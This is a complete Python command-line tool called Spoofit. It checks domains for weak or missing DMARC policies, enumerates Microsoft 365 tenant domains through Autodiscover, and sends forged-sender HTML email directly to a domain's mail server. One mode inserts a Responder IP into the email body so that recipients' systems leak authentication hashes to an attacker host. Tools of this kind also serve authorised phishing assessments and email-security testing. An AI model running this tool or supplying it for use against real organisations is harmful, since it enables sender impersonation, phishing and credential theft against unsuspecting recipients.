#!/usr/bin/env python3
import smtplib
import dns.resolver
import argparse
import os
import configparser
import xml.etree.ElementTree as ET
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
import csv

def print_banner():
    banner = r"""
   _____                   _____ __ 
  / ___/____  ____  ____  / __(_) /_
  \__ \/ __ \/ __ \/ __ \/ /_/ / __/
 ___/ / /_/ / /_/ / /_/ / __/ / /_  
/____/ .___/\____/\____/_/ /_/\__/  
    /_/                             
   """
    print(banner)

def get_domain_from_email(email):
    return email.split('@')[1]

def get_mx_record(domain):
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        mx_record = min(answers, key=lambda r: r.preference).exchange.to_text()
        return mx_record
    except Exception as e:
        print(f"[!] Error retrieving MX record for {domain}: {e}")
        return None

def send_email(mx_record, sender, recipient, subject, body):
    try:
        with smtplib.SMTP(mx_record, 25) as server:
            server.ehlo_or_helo_if_needed()
            server.mail(sender)
            code, msg = server.rcpt(recipient)
            if code != 250:
                print(f"[!] Failed to send email to {recipient}: {msg}")
                return
            server.data(
                f"To: {recipient}\r\n"
                f"From: {sender}\r\n"
                f"Subject: {subject}\r\n"
                f"Content-Type: text/html\r\n\r\n{body}"
            )
            print(f"[+] Email sent to {recipient}")
    except smtplib.SMTPRecipientsRefused:
        print(f"[!] Recipient refused: {recipient}")
    except smtplib.SMTPException as e:
        print(f"[!] Error sending email to {recipient}: {e}")

def load_config(forced=False):
    config = configparser.ConfigParser()
    config_file = 'conf/spoofit.conf'
    if not os.path.exists(config_file):
        print(f"[!] Configuration file {config_file} does not exist.")
        return None
    config.read(config_file)
    if forced:
        subject = config.get('ForcedAuthEmail', 'subject')
        body_file = config.get('ForcedAuthEmail', 'body_file')
        with open(body_file, 'r') as file:
            body = file.read()
    else:
        subject = config.get('Email', 'subject')
        body = config.get('Email', 'body')
    return subject, body

def create_forced_auth_email(body_template, responder_ip):
    return body_template % {'responder': responder_ip}

def check_spoofability(domain):
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    result = {"domain": domain, "policy": "", "spoofable": False}
    try:
        try:
            dmarc_answer = dns.resolver.resolve(f"_dmarc.{domain}", "TXT")
            dmarc_record = str(dmarc_answer[0]).lower()
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            dmarc_record = None

        if dmarc_record and "p=reject" in dmarc_record:
            print(f"{RED}[-] Spoofing not possible for {domain}: DMARC record p=reject (fully enforced).{RESET}")
            result["policy"] = "p=reject (fully enforced)"
        elif dmarc_record and "p=quarantine" in dmarc_record:
            print(f"{YELLOW}[!] DMARC record p=quarantine for {domain} (partial).{RESET}")
            print(f"{YELLOW}[+] Spoofing email will likely land in spam (user action required).{RESET}")
            result["policy"] = "p=quarantine (partial)"
            result["spoofable"] = True
        elif dmarc_record and "p=none" in dmarc_record:
            print(f"{YELLOW}[!] DMARC record p=none for {domain} (not enforced).{RESET}")
            print(f"{GREEN}[+] Spoofing possible — no enforcement.{RESET}")
            result["policy"] = "p=none (not enforced)"
            result["spoofable"] = True
        else:
            print(f"{YELLOW}[!] No valid DMARC record for {domain}.{RESET}")
            print(f"{GREEN}[+] Spoofing possible — no policy.{RESET}")
            result["policy"] = "No record"
            result["spoofable"] = True
    except Exception as e:
        print(f"[!] Error checking spoofability for {domain}: {e}")
        result["policy"] = "Error"
    return result

def enumerate_tenant_domains(domain):
    body = f"""<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages"
        xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types"
        xmlns:a="http://www.w3.org/2005/08/addressing"
        xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema">
        <soap:Header>
            <a:RequestedServerVersion>Exchange2010</a:RequestedServerVersion>
            <a:MessageID>urn:uuid:1234abcd-9e05-465e-ade9-aae14c4bcd10</a:MessageID>
            <a:Action soap:mustUnderstand="1">
              http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation
            </a:Action>
            <a:To soap:mustUnderstand="1">
              https://autodiscover.byfcxu-dom.extest.microsoft.com/autodiscover/autodiscover.svc
            </a:To>
            <a:ReplyTo>
                <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
            </a:ReplyTo>
        </soap:Header>
        <soap:Body>
            <GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
                <Request>
                    <Domain>{domain}</Domain>
                </Request>
            </GetFederationInformationRequestMessage>
        </soap:Body>
    </soap:Envelope>"""

    headers = {"Content-Type": "text/xml; charset=utf-8", "User-Agent": "AutodiscoverClient"}
    url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"

    try:
        request = Request(url, data=body.encode(), headers=headers)
        with urlopen(request) as response:
            xml_data = response.read().decode()
    except (HTTPError, URLError) as e:
        print(f"[!] Error performing Autodiscover: {e}")
        return []

    domains_found = []
    try:
        root = ET.fromstring(xml_data)
        namespace = "{http://schemas.microsoft.com/exchange/2010/Autodiscover}"
        for elem in root.iter():
            if elem.tag == f"{namespace}Domain":
                if elem.text and elem.text.strip():
                    domains_found.append(elem.text.strip())
    except Exception as e:
        print(f"[!] Error parsing Autodiscover XML: {e}")
        return []
    return list(set(domains_found))

def print_summary_table(dmarc_results):
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

    filtered = [r for r in dmarc_results if not r["domain"].lower().endswith(".onmicrosoft.com")]
    if not filtered:
        print("[!] No domains to display in summary table (all onmicrosoft?).")
        return

    print("\nFinal DMARC Summary (excluding .onmicrosoft.com):")
    print("-" * 90)
    print(f"{'Domain':<30} | {'DMARC Policy':<30} | {'Spoofing Possible?'::<10}")
    print("-" * 90)

    for res in filtered:
        domain = res["domain"]
        policy = res["policy"]
        if res["spoofable"]:
            if "quarantine" in policy.lower():
                spoof_str = "Doubtful"
            else:
                spoof_str = f"{GREEN}Yes{RESET}"
        else:
            spoof_str = "No"
        print(f"{domain:<30} | {policy:<30} | {spoof_str}")
    print("-" * 70 + "\n")

def export_results_csv(dmarc_results, filename):
    filtered = [r for r in dmarc_results if not r["domain"].lower().endswith(".onmicrosoft.com")]
    if not filtered:
        print(f"[!] No results to export to {filename} (all onmicrosoft?).")
        return
    try:
        with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["Domain", "DMARC Policy", "Spoofing Possible?"])
            for r in filtered:
                if r["spoofable"]:
                    if "quarantine" in r["policy"].lower():
                        spoof = "Doubtful"
                    else:
                        spoof = "Yes"
                else:
                    spoof = "No"
                writer.writerow([r["domain"], r["policy"], spoof])
        print(f"[+] Exported DMARC results to {filename}")
    except Exception as e:
        print(f"[!] Error exporting to {filename}: {e}")

def parse_tenant_name(domains, fallback_domain):
    """
    If there's a .onmicrosoft.com domain, parse out just the first part.
    For example: 
      'org.mail.onmicrosoft.com' -> remove '.onmicrosoft.com' -> 'org.mail' -> split('.') -> 'org'
    Otherwise, fallback.
    """
    onmicrosoft = [d for d in domains if d.lower().endswith(".onmicrosoft.com")]
    if onmicrosoft:
        raw = onmicrosoft[0].lower()
        raw = raw.replace(".onmicrosoft.com", "")
        # If there's a dot left after removing '.onmicrosoft.com', split on it and take the first segment.
        raw = raw.split('.', 1)[0]
        return f"{raw}_spoofit_results.csv"
    else:
        return fallback_domain.replace('.', '_') + "_spoofit_results.csv"

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="DMARC Focused Email Spoofing Tool",
        epilog="""
Examples:
  1) Check Spoofability of domain via missing DMARC records:
     Spoofit.py -c example.com

  2) Check Spoofability for all domains in Microsoft tenant (automatically saves CSV):
     Spoofit.py -c example.com -t

  3) Send spoofed email:
     Spoofit.py -s <sender@domain.com> -r <recipient@domain.com or file.txt>

  4) Forced-auth:
     Spoofit.py -s <sender@domain.com> -r <recipient@domain.com> -f <responder-ip>
        """,
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument('-c', '--check', help='Check spoofability for a domain.')
    parser.add_argument('-t', '--tenant', action='store_true', help='Check spoofability for all domains in Microsoft tenant.')
    parser.add_argument('-s', '--sender', help='Spoofed sender email.')
    parser.add_argument('-r', '--recipients', help='Recipient email or file.')
    parser.add_argument('-f', '--forced', help='Forced auth email with Responder IP.')

    args = parser.parse_args()
    if not any(vars(args).values()):
        parser.print_help()
        return

    if args.check:
        dmarc_results = []
        domains_to_check = [args.check]

        if args.tenant:
            all_domains = enumerate_tenant_domains(args.check)
            csv_filename = parse_tenant_name(all_domains, args.check)

            tenant_domains = [d for d in all_domains if not d.lower().endswith(".onmicrosoft.com")]
            if tenant_domains:
                print(f"[+] Tenant domains discovered for {args.check} (excluding .onmicrosoft.com):")
                for dom in tenant_domains:
                    print(f"  - {dom}")
                print("\nRunning DMARC checks on each discovered domain:\n")
                domains_to_check = tenant_domains
            else:
                print("[-] No additional tenant domains found or all .onmicrosoft.com.")
                print(f"Checking only {args.check}.\n")
                csv_filename = parse_tenant_name([], args.check)

        for dom in domains_to_check:
            res = check_spoofability(dom)
            dmarc_results.append(res)

        print_summary_table(dmarc_results)

        if args.tenant:
            export_results_csv(dmarc_results, csv_filename)
        return

    if args.recipients and args.sender:
        recipients = []
        if os.path.isfile(args.recipients):
            with open(args.recipients, 'r') as f:
                recipients = [line.strip() for line in f if line.strip()]
        else:
            recipients.append(args.recipients)

        if args.forced:
            cfg = load_config(forced=True)
            if not cfg:
                return
            subject, body_template = cfg
            body = create_forced_auth_email(body_template, args.forced)
            print(f"[*] Sending forced auth email to {len(recipients)} recipients.")
        else:
            cfg = load_config()
            if not cfg:
                return
            subject, body = cfg
            print(f"...Sending spoofed email to {len(recipients)} recipients.")

        domain = get_domain_from_email(args.sender)
        mx_record = get_mx_record(domain)
        if not mx_record:
            print("[!] Failed to retrieve MX record. Exiting...")
            return

        for rcp in recipients:
            send_email(mx_record, args.sender, rcp, subject, body)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
